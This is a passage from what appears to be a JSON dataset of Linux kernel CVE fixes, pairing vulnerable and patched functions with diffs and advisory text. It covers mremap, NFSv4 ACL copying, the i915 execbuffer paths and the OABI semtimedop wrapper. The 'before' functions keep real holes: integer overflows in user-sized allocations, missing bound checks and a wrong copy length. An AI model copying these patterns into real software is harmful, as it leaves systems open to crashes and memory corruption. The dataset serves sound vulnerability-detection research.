        "func": "asmlinkage long sys_oabi_semtimedop(int semid,\n\t\t\t\t    struct oabi_sembuf __user *tsops,\n\t\t\t\t    unsigned nsops,\n\t\t\t\t    const struct timespec __user *timeout)\n{\n\tstruct sembuf *sops;\n\tstruct timespec local_timeout;\n\tlong err;\n\tint i;\n\n\tif (nsops < 1 || nsops > SEMOPM)\n\t\treturn -EINVAL;\n\tsops = kmalloc(sizeof(*sops) * nsops, GFP_KERNEL);\n\tif (!sops)\n\t\treturn -ENOMEM;\n\terr = 0;\n\tfor (i = 0; i < nsops; i++) {\n\t\t__get_user_error(sops[i].sem_num, &tsops->sem_num, err);\n\t\t__get_user_error(sops[i].sem_op,  &tsops->sem_op,  err);\n\t\t__get_user_error(sops[i].sem_flg, &tsops->sem_flg, err);\n\t\ttsops++;\n\t}\n\tif (timeout) {\n\t\t/* copy this as well before changing domain protection */\n\t\terr |= copy_from_user(&local_timeout, timeout, sizeof(*timeout));\n\t\ttimeout = &local_timeout;\n\t}\n\tif (err) {\n\t\terr = -EFAULT;\n\t} else {\n\t\tmm_segment_t fs = get_fs();\n\t\tset_fs(KERNEL_DS);\n\t\terr = sys_semtimedop(semid, sops, nsops, timeout);\n\t\tset_fs(fs);\n\t}\n\tkfree(sops);\n\treturn err;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,7 +8,7 @@\n \tlong err;\n \tint i;\n \n-\tif (nsops < 1)\n+\tif (nsops < 1 || nsops > SEMOPM)\n \t\treturn -EINVAL;\n \tsops = kmalloc(sizeof(*sops) * nsops, GFP_KERNEL);\n \tif (!sops)",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (nsops < 1)"
            ],
            "added_lines": [
                "\tif (nsops < 1 || nsops > SEMOPM)"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-2496",
        "func_name": "torvalds/linux/vma_to_resize",
        "description": "Integer overflow in the vma_to_resize function in mm/mremap.c in the Linux kernel before 2.6.39 allows local users to cause a denial of service (BUG_ON and system crash) via a crafted mremap system call that expands a memory mapping.",
        "git_url": "https://github.com/torvalds/linux/commit/982134ba62618c2d69fbbbd166d0a11ee3b7e3d8",
        "commit_title": "mm: avoid wrapping vm_pgoff in mremap()",
        "commit_text": " The normal mmap paths all avoid creating a mapping where the pgoff inside the mapping could wrap around due to overflow.  However, an expanding mremap() can take such a non-wrapping mapping and make it bigger and cause a wrapping condition.  Noticed by Robert Swiecki when running a system call fuzzer, where it caused a BUG_ON() due to terminally confusing the vma_prio_tree code.  A vma dumping patch by Hugh then pinpointed the crazy wrapped case.  Reported-and-tested-by: Robert Swiecki <robert@swiecki.net> Cc: stable@kernel.org",
        "func_before": "static struct vm_area_struct *vma_to_resize(unsigned long addr,\n\tunsigned long old_len, unsigned long new_len, unsigned long *p)\n{\n\tstruct mm_struct *mm = current->mm;\n\tstruct vm_area_struct *vma = find_vma(mm, addr);\n\n\tif (!vma || vma->vm_start > addr)\n\t\tgoto Efault;\n\n\tif (is_vm_hugetlb_page(vma))\n\t\tgoto Einval;\n\n\t/* We can't remap across vm area boundaries */\n\tif (old_len > vma->vm_end - addr)\n\t\tgoto Efault;\n\n\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP)) {\n\t\tif (new_len > old_len)\n\t\t\tgoto Efault;\n\t}\n\n\tif (vma->vm_flags & VM_LOCKED) {\n\t\tunsigned long locked, lock_limit;\n\t\tlocked = mm->locked_vm << PAGE_SHIFT;\n\t\tlock_limit = rlimit(RLIMIT_MEMLOCK);\n\t\tlocked += new_len - old_len;\n\t\tif (locked > lock_limit && !capable(CAP_IPC_LOCK))\n\t\t\tgoto Eagain;\n\t}\n\n\tif (!may_expand_vm(mm, (new_len - old_len) >> PAGE_SHIFT))\n\t\tgoto Enomem;\n\n\tif (vma->vm_flags & VM_ACCOUNT) {\n\t\tunsigned long charged = (new_len - old_len) >> PAGE_SHIFT;\n\t\tif (security_vm_enough_memory(charged))\n\t\t\tgoto Efault;\n\t\t*p = charged;\n\t}\n\n\treturn vma;\n\nEfault:\t/* very odd choice for most of the cases, but... */\n\treturn ERR_PTR(-EFAULT);\nEinval:\n\treturn ERR_PTR(-EINVAL);\nEnomem:\n\treturn ERR_PTR(-ENOMEM);\nEagain:\n\treturn ERR_PTR(-EAGAIN);\n}",
        "func": "static struct vm_area_struct *vma_to_resize(unsigned long addr,\n\tunsigned long old_len, unsigned long new_len, unsigned long *p)\n{\n\tstruct mm_struct *mm = current->mm;\n\tstruct vm_area_struct *vma = find_vma(mm, addr);\n\n\tif (!vma || vma->vm_start > addr)\n\t\tgoto Efault;\n\n\tif (is_vm_hugetlb_page(vma))\n\t\tgoto Einval;\n\n\t/* We can't remap across vm area boundaries */\n\tif (old_len > vma->vm_end - addr)\n\t\tgoto Efault;\n\n\t/* Need to be careful about a growing mapping */\n\tif (new_len > old_len) {\n\t\tunsigned long pgoff;\n\n\t\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP))\n\t\t\tgoto Efault;\n\t\tpgoff = (addr - vma->vm_start) >> PAGE_SHIFT;\n\t\tpgoff += vma->vm_pgoff;\n\t\tif (pgoff + (new_len >> PAGE_SHIFT) < pgoff)\n\t\t\tgoto Einval;\n\t}\n\n\tif (vma->vm_flags & VM_LOCKED) {\n\t\tunsigned long locked, lock_limit;\n\t\tlocked = mm->locked_vm << PAGE_SHIFT;\n\t\tlock_limit = rlimit(RLIMIT_MEMLOCK);\n\t\tlocked += new_len - old_len;\n\t\tif (locked > lock_limit && !capable(CAP_IPC_LOCK))\n\t\t\tgoto Eagain;\n\t}\n\n\tif (!may_expand_vm(mm, (new_len - old_len) >> PAGE_SHIFT))\n\t\tgoto Enomem;\n\n\tif (vma->vm_flags & VM_ACCOUNT) {\n\t\tunsigned long charged = (new_len - old_len) >> PAGE_SHIFT;\n\t\tif (security_vm_enough_memory(charged))\n\t\t\tgoto Efault;\n\t\t*p = charged;\n\t}\n\n\treturn vma;\n\nEfault:\t/* very odd choice for most of the cases, but... */\n\treturn ERR_PTR(-EFAULT);\nEinval:\n\treturn ERR_PTR(-EINVAL);\nEnomem:\n\treturn ERR_PTR(-ENOMEM);\nEagain:\n\treturn ERR_PTR(-EAGAIN);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -14,9 +14,16 @@\n \tif (old_len > vma->vm_end - addr)\n \t\tgoto Efault;\n \n-\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP)) {\n-\t\tif (new_len > old_len)\n+\t/* Need to be careful about a growing mapping */\n+\tif (new_len > old_len) {\n+\t\tunsigned long pgoff;\n+\n+\t\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP))\n \t\t\tgoto Efault;\n+\t\tpgoff = (addr - vma->vm_start) >> PAGE_SHIFT;\n+\t\tpgoff += vma->vm_pgoff;\n+\t\tif (pgoff + (new_len >> PAGE_SHIFT) < pgoff)\n+\t\t\tgoto Einval;\n \t}\n \n \tif (vma->vm_flags & VM_LOCKED) {",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP)) {",
                "\t\tif (new_len > old_len)"
            ],
            "added_lines": [
                "\t/* Need to be careful about a growing mapping */",
                "\tif (new_len > old_len) {",
                "\t\tunsigned long pgoff;",
                "",
                "\t\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP))",
                "\t\tpgoff = (addr - vma->vm_start) >> PAGE_SHIFT;",
                "\t\tpgoff += vma->vm_pgoff;",
                "\t\tif (pgoff + (new_len >> PAGE_SHIFT) < pgoff)",
                "\t\t\tgoto Einval;"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2375",
        "func_name": "torvalds/linux/__nfs4_get_acl_uncached",
        "description": "The __nfs4_get_acl_uncached function in fs/nfs/nfs4proc.c in the NFSv4 implementation in the Linux kernel before 3.3.2 uses an incorrect length variable during a copy operation, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words in an FATTR4_ACL reply.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-4131.",
        "git_url": "https://github.com/torvalds/linux/commit/20e0fa98b751facf9a1101edaefbc19c82616a68",
        "commit_title": "Fix length of buffer copied in __nfs4_get_acl_uncached",
        "commit_text": " _copy_from_pages() used to copy data from the temporary buffer to the user passed buffer is passed the wrong size parameter when copying data. res.acl_len contains both the bitmap and acl lenghts while acl_len contains the acl length after adjusting for the bitmap size. ",
        "func_before": "static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)\n{\n\tstruct page *pages[NFS4ACL_MAXPAGES] = {NULL, };\n\tstruct nfs_getaclargs args = {\n\t\t.fh = NFS_FH(inode),\n\t\t.acl_pages = pages,\n\t\t.acl_len = buflen,\n\t};\n\tstruct nfs_getaclres res = {\n\t\t.acl_len = buflen,\n\t};\n\tvoid *resp_buf;\n\tstruct rpc_message msg = {\n\t\t.rpc_proc = &nfs4_procedures[NFSPROC4_CLNT_GETACL],\n\t\t.rpc_argp = &args,\n\t\t.rpc_resp = &res,\n\t};\n\tint ret = -ENOMEM, npages, i, acl_len = 0;\n\n\tnpages = (buflen + PAGE_SIZE - 1) >> PAGE_SHIFT;\n\t/* As long as we're doing a round trip to the server anyway,\n\t * let's be prepared for a page of acl data. */\n\tif (npages == 0)\n\t\tnpages = 1;\n\n\tfor (i = 0; i < npages; i++) {\n\t\tpages[i] = alloc_page(GFP_KERNEL);\n\t\tif (!pages[i])\n\t\t\tgoto out_free;\n\t}\n\tif (npages > 1) {\n\t\t/* for decoding across pages */\n\t\tres.acl_scratch = alloc_page(GFP_KERNEL);\n\t\tif (!res.acl_scratch)\n\t\t\tgoto out_free;\n\t}\n\targs.acl_len = npages * PAGE_SIZE;\n\targs.acl_pgbase = 0;\n\t/* Let decode_getfacl know not to fail if the ACL data is larger than\n\t * the page we send as a guess */\n\tif (buf == NULL)\n\t\tres.acl_flags |= NFS4_ACL_LEN_REQUEST;\n\tresp_buf = page_address(pages[0]);\n\n\tdprintk(\"%s  buf %p buflen %zu npages %d args.acl_len %zu\\n\",\n\t\t__func__, buf, buflen, npages, args.acl_len);\n\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode),\n\t\t\t     &msg, &args.seq_args, &res.seq_res, 0);\n\tif (ret)\n\t\tgoto out_free;\n\n\tacl_len = res.acl_len - res.acl_data_offset;\n\tif (acl_len > args.acl_len)\n\t\tnfs4_write_cached_acl(inode, NULL, acl_len);\n\telse\n\t\tnfs4_write_cached_acl(inode, resp_buf + res.acl_data_offset,\n\t\t\t\t      acl_len);\n\tif (buf) {\n\t\tret = -ERANGE;\n\t\tif (acl_len > buflen)\n\t\t\tgoto out_free;\n\t\t_copy_from_pages(buf, pages, res.acl_data_offset,\n\t\t\t\tres.acl_len);\n\t}\n\tret = acl_len;\nout_free:\n\tfor (i = 0; i < npages; i++)\n\t\tif (pages[i])\n\t\t\t__free_page(pages[i]);\n\tif (res.acl_scratch)\n\t\t__free_page(res.acl_scratch);\n\treturn ret;\n}",
        "func": "static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)\n{\n\tstruct page *pages[NFS4ACL_MAXPAGES] = {NULL, };\n\tstruct nfs_getaclargs args = {\n\t\t.fh = NFS_FH(inode),\n\t\t.acl_pages = pages,\n\t\t.acl_len = buflen,\n\t};\n\tstruct nfs_getaclres res = {\n\t\t.acl_len = buflen,\n\t};\n\tvoid *resp_buf;\n\tstruct rpc_message msg = {\n\t\t.rpc_proc = &nfs4_procedures[NFSPROC4_CLNT_GETACL],\n\t\t.rpc_argp = &args,\n\t\t.rpc_resp = &res,\n\t};\n\tint ret = -ENOMEM, npages, i, acl_len = 0;\n\n\tnpages = (buflen + PAGE_SIZE - 1) >> PAGE_SHIFT;\n\t/* As long as we're doing a round trip to the server anyway,\n\t * let's be prepared for a page of acl data. */\n\tif (npages == 0)\n\t\tnpages = 1;\n\n\tfor (i = 0; i < npages; i++) {\n\t\tpages[i] = alloc_page(GFP_KERNEL);\n\t\tif (!pages[i])\n\t\t\tgoto out_free;\n\t}\n\tif (npages > 1) {\n\t\t/* for decoding across pages */\n\t\tres.acl_scratch = alloc_page(GFP_KERNEL);\n\t\tif (!res.acl_scratch)\n\t\t\tgoto out_free;\n\t}\n\targs.acl_len = npages * PAGE_SIZE;\n\targs.acl_pgbase = 0;\n\t/* Let decode_getfacl know not to fail if the ACL data is larger than\n\t * the page we send as a guess */\n\tif (buf == NULL)\n\t\tres.acl_flags |= NFS4_ACL_LEN_REQUEST;\n\tresp_buf = page_address(pages[0]);\n\n\tdprintk(\"%s  buf %p buflen %zu npages %d args.acl_len %zu\\n\",\n\t\t__func__, buf, buflen, npages, args.acl_len);\n\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode),\n\t\t\t     &msg, &args.seq_args, &res.seq_res, 0);\n\tif (ret)\n\t\tgoto out_free;\n\n\tacl_len = res.acl_len - res.acl_data_offset;\n\tif (acl_len > args.acl_len)\n\t\tnfs4_write_cached_acl(inode, NULL, acl_len);\n\telse\n\t\tnfs4_write_cached_acl(inode, resp_buf + res.acl_data_offset,\n\t\t\t\t      acl_len);\n\tif (buf) {\n\t\tret = -ERANGE;\n\t\tif (acl_len > buflen)\n\t\t\tgoto out_free;\n\t\t_copy_from_pages(buf, pages, res.acl_data_offset,\n\t\t\t\tacl_len);\n\t}\n\tret = acl_len;\nout_free:\n\tfor (i = 0; i < npages; i++)\n\t\tif (pages[i])\n\t\t\t__free_page(pages[i]);\n\tif (res.acl_scratch)\n\t\t__free_page(res.acl_scratch);\n\treturn ret;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -60,7 +60,7 @@\n \t\tif (acl_len > buflen)\n \t\t\tgoto out_free;\n \t\t_copy_from_pages(buf, pages, res.acl_data_offset,\n-\t\t\t\tres.acl_len);\n+\t\t\t\tacl_len);\n \t}\n \tret = acl_len;\n out_free:",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\t\tres.acl_len);"
            ],
            "added_lines": [
                "\t\t\t\tacl_len);"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2383",
        "func_name": "torvalds/linux/i915_gem_execbuffer2",
        "description": "Integer overflow in the i915_gem_execbuffer2 function in drivers/gpu/drm/i915/i915_gem_execbuffer.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.3.5 on 32-bit platforms allows local users to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted ioctl call.",
        "git_url": "https://github.com/torvalds/linux/commit/ed8cd3b2cd61004cab85380c52b1817aca1ca49b",
        "commit_title": "drm/i915: fix integer overflow in i915_gem_execbuffer2()",
        "commit_text": " On 32-bit systems, a large args->buffer_count from userspace via ioctl may overflow the allocation size, leading to out-of-bounds access.  This vulnerability was introduced in commit 8408c282 (\"drm/i915: First try a normal large kmalloc for the temporary exec buffers\").  Cc: stable@vger.kernel.org",
        "func_before": "int\ni915_gem_execbuffer2(struct drm_device *dev, void *data,\n\t\t     struct drm_file *file)\n{\n\tstruct drm_i915_gem_execbuffer2 *args = data;\n\tstruct drm_i915_gem_exec_object2 *exec2_list = NULL;\n\tint ret;\n\n\tif (args->buffer_count < 1) {\n\t\tDRM_DEBUG(\"execbuf2 with %d buffers\\n\", args->buffer_count);\n\t\treturn -EINVAL;\n\t}\n\n\texec2_list = kmalloc(sizeof(*exec2_list)*args->buffer_count,\n\t\t\t     GFP_KERNEL | __GFP_NOWARN | __GFP_NORETRY);\n\tif (exec2_list == NULL)\n\t\texec2_list = drm_malloc_ab(sizeof(*exec2_list),\n\t\t\t\t\t   args->buffer_count);\n\tif (exec2_list == NULL) {\n\t\tDRM_DEBUG(\"Failed to allocate exec list for %d buffers\\n\",\n\t\t\t  args->buffer_count);\n\t\treturn -ENOMEM;\n\t}\n\tret = copy_from_user(exec2_list,\n\t\t\t     (struct drm_i915_relocation_entry __user *)\n\t\t\t     (uintptr_t) args->buffers_ptr,\n\t\t\t     sizeof(*exec2_list) * args->buffer_count);\n\tif (ret != 0) {\n\t\tDRM_DEBUG(\"copy %d exec entries failed %d\\n\",\n\t\t\t  args->buffer_count, ret);\n\t\tdrm_free_large(exec2_list);\n\t\treturn -EFAULT;\n\t}\n\n\tret = i915_gem_do_execbuffer(dev, data, file, args, exec2_list);\n\tif (!ret) {\n\t\t/* Copy the new buffer offsets back to the user's exec list. */\n\t\tret = copy_to_user((struct drm_i915_relocation_entry __user *)\n\t\t\t\t   (uintptr_t) args->buffers_ptr,\n\t\t\t\t   exec2_list,\n\t\t\t\t   sizeof(*exec2_list) * args->buffer_count);\n\t\tif (ret) {\n\t\t\tret = -EFAULT;\n\t\t\tDRM_DEBUG(\"failed to copy %d exec entries \"\n\t\t\t\t  \"back to user (%d)\\n\",\n\t\t\t\t  args->buffer_count, ret);\n\t\t}\n\t}\n\n\tdrm_free_large(exec2_list);\n\treturn ret;\n}",
        "func": "int\ni915_gem_execbuffer2(struct drm_device *dev, void *data,\n\t\t     struct drm_file *file)\n{\n\tstruct drm_i915_gem_execbuffer2 *args = data;\n\tstruct drm_i915_gem_exec_object2 *exec2_list = NULL;\n\tint ret;\n\n\tif (args->buffer_count < 1 ||\n\t    args->buffer_count > UINT_MAX / sizeof(*exec2_list)) {\n\t\tDRM_DEBUG(\"execbuf2 with %d buffers\\n\", args->buffer_count);\n\t\treturn -EINVAL;\n\t}\n\n\texec2_list = kmalloc(sizeof(*exec2_list)*args->buffer_count,\n\t\t\t     GFP_KERNEL | __GFP_NOWARN | __GFP_NORETRY);\n\tif (exec2_list == NULL)\n\t\texec2_list = drm_malloc_ab(sizeof(*exec2_list),\n\t\t\t\t\t   args->buffer_count);\n\tif (exec2_list == NULL) {\n\t\tDRM_DEBUG(\"Failed to allocate exec list for %d buffers\\n\",\n\t\t\t  args->buffer_count);\n\t\treturn -ENOMEM;\n\t}\n\tret = copy_from_user(exec2_list,\n\t\t\t     (struct drm_i915_relocation_entry __user *)\n\t\t\t     (uintptr_t) args->buffers_ptr,\n\t\t\t     sizeof(*exec2_list) * args->buffer_count);\n\tif (ret != 0) {\n\t\tDRM_DEBUG(\"copy %d exec entries failed %d\\n\",\n\t\t\t  args->buffer_count, ret);\n\t\tdrm_free_large(exec2_list);\n\t\treturn -EFAULT;\n\t}\n\n\tret = i915_gem_do_execbuffer(dev, data, file, args, exec2_list);\n\tif (!ret) {\n\t\t/* Copy the new buffer offsets back to the user's exec list. */\n\t\tret = copy_to_user((struct drm_i915_relocation_entry __user *)\n\t\t\t\t   (uintptr_t) args->buffers_ptr,\n\t\t\t\t   exec2_list,\n\t\t\t\t   sizeof(*exec2_list) * args->buffer_count);\n\t\tif (ret) {\n\t\t\tret = -EFAULT;\n\t\t\tDRM_DEBUG(\"failed to copy %d exec entries \"\n\t\t\t\t  \"back to user (%d)\\n\",\n\t\t\t\t  args->buffer_count, ret);\n\t\t}\n\t}\n\n\tdrm_free_large(exec2_list);\n\treturn ret;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,7 +6,8 @@\n \tstruct drm_i915_gem_exec_object2 *exec2_list = NULL;\n \tint ret;\n \n-\tif (args->buffer_count < 1) {\n+\tif (args->buffer_count < 1 ||\n+\t    args->buffer_count > UINT_MAX / sizeof(*exec2_list)) {\n \t\tDRM_DEBUG(\"execbuf2 with %d buffers\\n\", args->buffer_count);\n \t\treturn -EINVAL;\n \t}",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (args->buffer_count < 1) {"
            ],
            "added_lines": [
                "\tif (args->buffer_count < 1 ||",
                "\t    args->buffer_count > UINT_MAX / sizeof(*exec2_list)) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2384",
        "func_name": "torvalds/linux/i915_gem_do_execbuffer",
        "description": "Integer overflow in the i915_gem_do_execbuffer function in drivers/gpu/drm/i915/i915_gem_execbuffer.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.3.5 on 32-bit platforms allows local users to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted ioctl call.",
        "git_url": "https://github.com/torvalds/linux/commit/44afb3a04391a74309d16180d1e4f8386fdfa745",
        "commit_title": "drm/i915: fix integer overflow in i915_gem_do_execbuffer()",
        "commit_text": " On 32-bit systems, a large args->num_cliprects from userspace via ioctl may overflow the allocation size, leading to out-of-bounds access.  This vulnerability was introduced in commit 432e58ed (\"drm/i915: Avoid allocation for execbuffer object list\").  Cc: stable@vger.kernel.org",
        "func_before": "static int\ni915_gem_do_execbuffer(struct drm_device *dev, void *data,\n\t\t       struct drm_file *file,\n\t\t       struct drm_i915_gem_execbuffer2 *args,\n\t\t       struct drm_i915_gem_exec_object2 *exec)\n{\n\tdrm_i915_private_t *dev_priv = dev->dev_private;\n\tstruct list_head objects;\n\tstruct eb_objects *eb;\n\tstruct drm_i915_gem_object *batch_obj;\n\tstruct drm_clip_rect *cliprects = NULL;\n\tstruct intel_ring_buffer *ring;\n\tu32 exec_start, exec_len;\n\tu32 seqno;\n\tu32 mask;\n\tint ret, mode, i;\n\n\tif (!i915_gem_check_execbuffer(args)) {\n\t\tDRM_DEBUG(\"execbuf with invalid offset/length\\n\");\n\t\treturn -EINVAL;\n\t}\n\n\tret = validate_exec_list(exec, args->buffer_count);\n\tif (ret)\n\t\treturn ret;\n\n\tswitch (args->flags & I915_EXEC_RING_MASK) {\n\tcase I915_EXEC_DEFAULT:\n\tcase I915_EXEC_RENDER:\n\t\tring = &dev_priv->ring[RCS];\n\t\tbreak;\n\tcase I915_EXEC_BSD:\n\t\tif (!HAS_BSD(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BSD)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[VCS];\n\t\tbreak;\n\tcase I915_EXEC_BLT:\n\t\tif (!HAS_BLT(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BLT)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[BCS];\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown ring: %d\\n\",\n\t\t\t  (int)(args->flags & I915_EXEC_RING_MASK));\n\t\treturn -EINVAL;\n\t}\n\n\tmode = args->flags & I915_EXEC_CONSTANTS_MASK;\n\tmask = I915_EXEC_CONSTANTS_MASK;\n\tswitch (mode) {\n\tcase I915_EXEC_CONSTANTS_REL_GENERAL:\n\tcase I915_EXEC_CONSTANTS_ABSOLUTE:\n\tcase I915_EXEC_CONSTANTS_REL_SURFACE:\n\t\tif (ring == &dev_priv->ring[RCS] &&\n\t\t    mode != dev_priv->relative_constants_mode) {\n\t\t\tif (INTEL_INFO(dev)->gen < 4)\n\t\t\t\treturn -EINVAL;\n\n\t\t\tif (INTEL_INFO(dev)->gen > 5 &&\n\t\t\t    mode == I915_EXEC_CONSTANTS_REL_SURFACE)\n\t\t\t\treturn -EINVAL;\n\n\t\t\t/* The HW changed the meaning on this bit on gen6 */\n\t\t\tif (INTEL_INFO(dev)->gen >= 6)\n\t\t\t\tmask &= ~I915_EXEC_CONSTANTS_REL_SURFACE;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown constants: %d\\n\", mode);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->buffer_count < 1) {\n\t\tDRM_DEBUG(\"execbuf with %d buffers\\n\", args->buffer_count);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->num_cliprects != 0) {\n\t\tif (ring != &dev_priv->ring[RCS]) {\n\t\t\tDRM_DEBUG(\"clip rectangles are only valid with the render ring\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\n\t\tcliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),\n\t\t\t\t    GFP_KERNEL);\n\t\tif (cliprects == NULL) {\n\t\t\tret = -ENOMEM;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\n\t\tif (copy_from_user(cliprects,\n\t\t\t\t     (struct drm_clip_rect __user *)(uintptr_t)\n\t\t\t\t     args->cliprects_ptr,\n\t\t\t\t     sizeof(*cliprects)*args->num_cliprects)) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\t}\n\n\tret = i915_mutex_lock_interruptible(dev);\n\tif (ret)\n\t\tgoto pre_mutex_err;\n\n\tif (dev_priv->mm.suspended) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -EBUSY;\n\t\tgoto pre_mutex_err;\n\t}\n\n\teb = eb_create(args->buffer_count);\n\tif (eb == NULL) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -ENOMEM;\n\t\tgoto pre_mutex_err;\n\t}\n\n\t/* Look up object handles */\n\tINIT_LIST_HEAD(&objects);\n\tfor (i = 0; i < args->buffer_count; i++) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = to_intel_bo(drm_gem_object_lookup(dev, file,\n\t\t\t\t\t\t\texec[i].handle));\n\t\tif (&obj->base == NULL) {\n\t\t\tDRM_DEBUG(\"Invalid object handle %d at index %d\\n\",\n\t\t\t\t   exec[i].handle, i);\n\t\t\t/* prevent error path from reading uninitialized data */\n\t\t\tret = -ENOENT;\n\t\t\tgoto err;\n\t\t}\n\n\t\tif (!list_empty(&obj->exec_list)) {\n\t\t\tDRM_DEBUG(\"Object %p [handle %d, index %d] appears more than once in object list\\n\",\n\t\t\t\t   obj, exec[i].handle, i);\n\t\t\tret = -EINVAL;\n\t\t\tgoto err;\n\t\t}\n\n\t\tlist_add_tail(&obj->exec_list, &objects);\n\t\tobj->exec_handle = exec[i].handle;\n\t\tobj->exec_entry = &exec[i];\n\t\teb_add_object(eb, obj);\n\t}\n\n\t/* take note of the batch buffer before we might reorder the lists */\n\tbatch_obj = list_entry(objects.prev,\n\t\t\t       struct drm_i915_gem_object,\n\t\t\t       exec_list);\n\n\t/* Move the objects en-masse into the GTT, evicting if necessary. */\n\tret = i915_gem_execbuffer_reserve(ring, file, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\t/* The objects are in their final locations, apply the relocations. */\n\tret = i915_gem_execbuffer_relocate(dev, eb, &objects);\n\tif (ret) {\n\t\tif (ret == -EFAULT) {\n\t\t\tret = i915_gem_execbuffer_relocate_slow(dev, file, ring,\n\t\t\t\t\t\t\t\t&objects, eb,\n\t\t\t\t\t\t\t\texec,\n\t\t\t\t\t\t\t\targs->buffer_count);\n\t\t\tBUG_ON(!mutex_is_locked(&dev->struct_mutex));\n\t\t}\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\t/* Set the pending read domains for the batch buffer to COMMAND */\n\tif (batch_obj->base.pending_write_domain) {\n\t\tDRM_DEBUG(\"Attempting to use self-modifying batch buffer\\n\");\n\t\tret = -EINVAL;\n\t\tgoto err;\n\t}\n\tbatch_obj->base.pending_read_domains |= I915_GEM_DOMAIN_COMMAND;\n\n\tret = i915_gem_execbuffer_move_to_gpu(ring, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\tseqno = i915_gem_next_request_seqno(ring);\n\tfor (i = 0; i < ARRAY_SIZE(ring->sync_seqno); i++) {\n\t\tif (seqno < ring->sync_seqno[i]) {\n\t\t\t/* The GPU can not handle its semaphore value wrapping,\n\t\t\t * so every billion or so execbuffers, we need to stall\n\t\t\t * the GPU in order to reset the counters.\n\t\t\t */\n\t\t\tret = i915_gpu_idle(dev, true);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tBUG_ON(ring->sync_seqno[i]);\n\t\t}\n\t}\n\n\tif (ring == &dev_priv->ring[RCS] &&\n\t    mode != dev_priv->relative_constants_mode) {\n\t\tret = intel_ring_begin(ring, 4);\n\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\tintel_ring_emit(ring, MI_NOOP);\n\t\tintel_ring_emit(ring, MI_LOAD_REGISTER_IMM(1));\n\t\tintel_ring_emit(ring, INSTPM);\n\t\tintel_ring_emit(ring, mask << 16 | mode);\n\t\tintel_ring_advance(ring);\n\n\t\tdev_priv->relative_constants_mode = mode;\n\t}\n\n\tif (args->flags & I915_EXEC_GEN7_SOL_RESET) {\n\t\tret = i915_reset_gen7_sol_offsets(dev, ring);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ttrace_i915_gem_ring_dispatch(ring, seqno);\n\n\texec_start = batch_obj->gtt_offset + args->batch_start_offset;\n\texec_len = args->batch_len;\n\tif (cliprects) {\n\t\tfor (i = 0; i < args->num_cliprects; i++) {\n\t\t\tret = i915_emit_box(dev, &cliprects[i],\n\t\t\t\t\t    args->DR1, args->DR4);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tret = ring->dispatch_execbuffer(ring,\n\t\t\t\t\t\t\texec_start, exec_len);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\t\t}\n\t} else {\n\t\tret = ring->dispatch_execbuffer(ring, exec_start, exec_len);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ti915_gem_execbuffer_move_to_active(&objects, ring, seqno);\n\ti915_gem_execbuffer_retire_commands(dev, file, ring);\n\nerr:\n\teb_destroy(eb);\n\twhile (!list_empty(&objects)) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = list_first_entry(&objects,\n\t\t\t\t       struct drm_i915_gem_object,\n\t\t\t\t       exec_list);\n\t\tlist_del_init(&obj->exec_list);\n\t\tdrm_gem_object_unreference(&obj->base);\n\t}\n\n\tmutex_unlock(&dev->struct_mutex);\n\npre_mutex_err:\n\tkfree(cliprects);\n\treturn ret;\n}",
